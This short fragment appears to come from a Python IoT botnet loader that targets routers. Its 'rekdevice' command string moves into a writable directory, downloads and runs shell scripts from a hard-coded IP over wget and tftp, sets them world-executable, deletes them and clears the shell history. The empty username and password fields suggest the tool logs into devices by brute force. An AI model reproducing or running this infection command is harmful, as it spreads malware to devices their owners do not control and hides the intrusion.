...
class router(threading.Thread):
    def __init__ (self, ip):
        ...
        self.rekdevice="cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://128.199.96.247/Sakura.sh; chmod 777 *; sh Sakura.sh; tftp -g 128.199.96.247 -r tftp1.sh; chmod 777 *; sh tftp1.sh; rm -rf *.sh; history -c" 
    def run(self):
        global fh
        username = ""
        password = ""
